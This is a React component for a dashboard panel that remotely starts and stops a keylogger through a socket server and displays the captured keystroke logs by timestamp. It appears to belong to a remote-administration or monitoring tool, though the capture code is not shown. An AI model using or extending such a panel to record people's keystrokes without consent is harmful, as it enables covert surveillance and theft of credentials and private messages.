import { useState, useEffect } from "react";
import { Card, CardBody, CardHeader } from "@heroui/card";
import { Button } from "@heroui/button";
import { Kbd } from "@heroui/kbd";
import { ScrollShadow } from "@heroui/scroll-shadow";
import { useSocket, KeyLogger } from "@/Components/SocketContext";
import { PlayIcon, StopIcon } from "@/Components/Icons";

export const KeyloggerView = () => {
  const {
    IsKeyLoggerOn,
    KeyLoggers,
    IsServerConnected,
    StartKeyLogger,
    StopKeyLogger,
    PrintKeyLogger,
  } = useSocket();

  const [SelectedLogIndex, SetSelectedLogIndex] = useState<number | null>(null);

  const HandleStartStop = () => {
    if (IsKeyLoggerOn) {
      StopKeyLogger();
    } else {
      StartKeyLogger();
    }
  };

  const HandlePrint = () => {
    PrintKeyLogger();
  };

  const FormatTime = (TimeStamp: number) => {
    return new Date(TimeStamp).toLocaleString();
  };

  return (
    <div className="flex flex-col h-full gap-4">
      <div className="flex justify-between items-center">
        <h2 className="text-2xl font-bold">KeyLogger</h2>
        <div className="flex gap-2">
          <Button
            color={IsKeyLoggerOn ? "danger" : "primary"}
            isDisabled={!IsServerConnected}
            startContent={IsKeyLoggerOn ? <StopIcon /> : <PlayIcon />}
            onPress={HandleStartStop}
          >
            {IsKeyLoggerOn ? "Stop KeyLogger" : "Start KeyLogger"}
          </Button>
          <Button
            color="secondary"
            isDisabled={!IsKeyLoggerOn || !IsServerConnected}
            onPress={HandlePrint}
          >
            Print
          </Button>
        </div>
      </div>

      <div className="flex flex-col lg:flex-row gap-4 h-full overflow-hidden p-4 items-center justify-center">
        <Card className="w-full lg:w-1/5 h-full">
          <CardHeader className="pb-0">
            <p className="text-small text-default-500">
              {KeyLoggers?.length || 0} Logs
            </p>
          </CardHeader>
          <CardBody className="p-2">
            <ScrollShadow hideScrollBar className="h-full w-full">
              <div className="grid grid-cols-1 gap-2 p-2">
                {KeyLoggers?.map((Log: KeyLogger, Index: number) => (
                  <div
                    key={Log.TimeStamp}
                    className={`cursor-pointer rounded-lg border-2 p-3 transition-all ${SelectedLogIndex === Index
                      ? "border-primary bg-primary/10"
                      : "border-transparent hover:bg-default-100"
                      }`}
                    onClick={() => SetSelectedLogIndex(Index)}
                  >
                    <div className="text-small font-bold">
                      {FormatTime(Log.TimeStamp)}
                    </div>
                    <div className="text-tiny text-default-500 truncate">
                      {Log.Key.length} Keystrokes
                    </div>
                  </div>
                ))}
                {(!KeyLoggers || KeyLoggers.length === 0) && (
                  <div className="text-center py-10 text-default-400">
                    No logs yet.
                  </div>
                )}
              </div>
            </ScrollShadow>
          </CardBody>
        </Card>

        <Card className="w-full lg:w-2/3 h-full">
          <CardBody className="p-4">
            {SelectedLogIndex !== null ? (
              <div className="h-full flex flex-col gap-4">
                <div className="flex justify-between items-center border-b pb-2">
                  <div className="flex flex-col">
                    <span className="text-small font-bold">
                      Log: {FormatTime(KeyLoggers[SelectedLogIndex].TimeStamp)}
                    </span>
                    <span className="text-tiny text-default-500">
                      {KeyLoggers[SelectedLogIndex].Key.length} Keystrokes
                    </span>
                  </div>
                </div>
                <ScrollShadow hideScrollBar className="h-full w-full bg-default-100 p-4 rounded-lg font-mono text-small whitespace-pre-wrap">
                  <div className="flex flex-wrap gap-1 justify-start">
                    {KeyLoggers[SelectedLogIndex].Key.map((Key: string, Index: number) => (
                      <Kbd key={Index}>{Key}</Kbd>
                    ))}
                  </div>
                </ScrollShadow>
              </div>
            ) : (
              <div className="flex flex-col items-center justify-center h-full text-default-400">
                <p>Select a log to view content</p>
              </div>
            )}
          </CardBody>
        </Card>
      </div>
    </div>
  );
};
